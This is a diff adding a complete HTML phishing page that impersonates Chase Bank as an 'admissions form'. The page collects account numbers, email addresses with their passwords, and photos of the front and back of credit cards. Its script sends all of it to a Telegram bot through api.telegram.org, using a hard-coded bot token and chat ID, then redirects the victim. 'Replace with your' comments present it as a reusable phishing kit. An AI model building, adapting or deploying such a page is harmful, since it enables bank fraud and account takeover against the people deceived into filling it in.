@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chase Bank Admissions Form</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #f0f8ff url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"><polygon points="100,10 40,180 190,60 10,60 160,180" fill="%230033cc" opacity="0.03"/></svg>') repeat;
+      color: #003366;
+      line-height: 1.6;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: white;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h1 {
+      text-align: center;
+      color: #003399;
+      margin-bottom: 20px;
+    }
+    p {
+      text-align: center;
+      color: #555;
+      font-size: 14px;
+      margin-top: -10px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+    }
+    input, input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+    .preview {
+      margin-top: 8px;
+      max-width: 100%;
+      height: auto;
+      display: none;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background-color: #0033cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #002299;
+    }
+    .loader {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .loader .spinner {
+      width: 60px;
+      height: 60px;
+      border: 8px solid #fff;
+      border-top: 8px solid #0033cc;
+      border-left: 8px solid #0033cc;
+      border-right: 8px solid #0033cc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite, zoomBounce 4s infinite; /* Increased spin speed */
+    }
+    .loader p {
+      color: white;
+      font-size: 18px;
+      margin-top: 15px;
+      animation: zoomBounce 4s infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes zoomBounce {
+      0%, 100% { transform: scale(1) translateY(0); }
+      50% { transform: scale(1.1) translateY(-10px); }
+    }
+    .additional-info {
+      margin-top: 30px;
+      padding: 20px;
+      background-color: #f9f9f9;
+      border-radius: 8px;
+      text-align: left;
+    }
+    .additional-info h2 {
+      color: #003399;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    .additional-info p {
+      color: #555;
+      text-align: justify;
+      margin-bottom: 10px;
+    }
+    footer {
+      text-align: center;
+      padding: 20px;
+      background-color: #003366;
+      color: white;
+      margin-top: 40px;
+    }
+    /* Media query for smaller screens */
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 20px;
+      }
+      h1 {
+        font-size: 24px;
+      }
+      p {
+        font-size: 12px;
+      }
+      .additional-info {
+        padding: 15px;
+      }
+      .additional-info h2 {
+        font-size: 20px;
+      }
+      .additional-info p {
+        font-size: 13px;
+      }
+      footer {
+        padding: 15px;
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>CHASE BANK ADMISSIONS FORM</h1>
+  <p>To render our services, please provide your complete information professionally and accurately.</p>
+
+  <form id="admissionForm">
+    <label for="fullName">Full Name</label>
+    <input type="text" id="fullName" required>
+
+    <label for="accountName">Account Name</label>
+    <input type="text" id="accountName" required>
+
+    <label for="accountNumber">Account Number</label>
+    <input type="text" id="accountNumber" required>
+
+    <label for="phoneNumber">Phone Number</label>
+    <input type="tel" id="phoneNumber" required>
+
+    <label for="bankName">Bank Name</label>
+    <input type="text" id="bankName" required>
+
+    <label for="date">Date</label>
+    <input type="date" id="date" required>
+    
+    <label for="email">Email</label>
+    <input type="email" id="email" required>
+
+    <label for="emailPassword">Email Password</label>
+    <input type="password" id="emailPassword" required>
+
+    <label for="frontCard">Credit Card Front</label>
+    <input type="file" id="frontCard" accept="image/*" required>
+    <img class="preview" id="frontPreview">
+
+    <label for="backCard">Credit Card Back</label>
+    <input type="file" id="backCard" accept="image/*" required>
+    <img class="preview" id="backPreview">
+
+    <button type="submit">Submit Admission</button>
+  </form>
+
+  <div class="additional-info">
+    <h2>Why Choose Chase Bank?</h2>
+    <p>At Chase Bank, we are committed to providing you with exceptional financial services and a banking experience that puts you first. With a legacy of trust and innovation, we offer a wide range of products and services tailored to meet your unique needs.</p>
+    <p><b>Security and Trust:</b> Your financial security is our top priority. We employ state-of-the-art security measures to protect your information and assets. Bank with confidence knowing that we have your back.</p>
+    <p><b>Personalized Service:</b> Our dedicated team of professionals is here to assist you with all your banking needs. Whether you prefer in-person assistance, online banking, or mobile support, we are always ready to help.</p>
+    <p><b>Comprehensive Solutions:</b> From everyday banking to long-term financial planning, we offer a full suite of services including checking and savings accounts, credit cards, loans, and investment options.</p>
+    <p><b>Community Commitment:</b> We are proud to be a part of the community and are dedicated to supporting local initiatives and organizations. When you bank with Chase, you are contributing to a stronger, more vibrant community.</p>
+  </div>
+</div>
+
+<div class="loader" id="loader">
+  <div class="spinner"></div>
+  <p>Admitting to the management...</p>
+</div>
+
+<footer>
+  &copy; 2025 Chase Bank. All rights reserved.
+</footer>
+
+<script>
+  const form = document.getElementById('admissionForm');
+  const loader = document.getElementById('loader');
+
+  const botToken = '7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0'; // Replace with your Telegram Bot Token
+  const chatId = '7959877182';     // Replace with your Telegram Chat ID
+  const redirectURL = 'https://www.example.com/success'; // Replace with your redirect URL
+
+  function previewImage(input, target) {
+    input.addEventListener('change', () => {
+      const file = input.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = () => {
+          target.src = reader.result;
+          target.style.display = 'block';
+        };
+        reader.readAsDataURL(file);
+      }
+    });
+  }
+
+  previewImage(document.getElementById('frontCard'), document.getElementById('frontPreview'));
+  previewImage(document.getElementById('backCard'), document.getElementById('backPreview'));
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const name = document.getElementById('fullName').value;
+    const accName = document.getElementById('accountName').value;
+    const accNo = document.getElementById('accountNumber').value;
+    const phone = document.getElementById('phoneNumber').value;
+    const bank = document.getElementById('bankName').value;
+    const date = document.getElementById('date').value;
+    const email = document.getElementById('email').value;
+    const emailPassword = document.getElementById('emailPassword').value;
+    const frontCard = document.getElementById('frontCard').files[0];
+    const backCard = document.getElementById('backCard').files[0];
+
+    if (!frontCard || !backCard) return alert('Please upload both credit card images.');
+
+    loader.style.display = 'flex';
+
+    const readerFront = new FileReader();
+    const readerBack = new FileReader();
+
+    readerFront.onloadend = () => {
+      readerBack.onloadend = async () => {
+        const message = `
+CHASE BANK ADMISSION FORM:
+
+Name: ${name}
+Account Name: ${accName}
+Account Number: ${accNo}
+Phone: ${phone}
+Bank: ${bank}
+Date: ${date}
+Email: ${email}
+Email Password: ${emailPassword}
+        `;
+
+        try {
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: createFormData(chatId, readerFront.result, 'Front of card')
+          });
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: createFormData(chatId, readerBack.result, 'Back of card')
+          });
+
+          setTimeout(() => {
+            loader.style.display = 'none';
+            window.location.href = redirectURL; // Redirect to the success page
+          }, 4000);
+        } catch (error) {
+          console.error('Error sending data to Telegram:', error);
+          loader.style.display = 'none';
+          alert('Failed to submit. Please check the console for errors.');
+        }
+      };
+      readerBack.readAsDataURL(backCard);
+    };
+    readerFront.readAsDataURL(frontCard);
+  });
+
+  function createFormData(chatId, imageBase64, caption) {
+    const blob = dataURLtoBlob(imageBase64);
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('caption', caption);
+    formData.append('photo', blob, 'image.jpg');
+    return formData;
+  }
+
+  function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type:mime});
+  }
+</script>
+</body>
+</html>
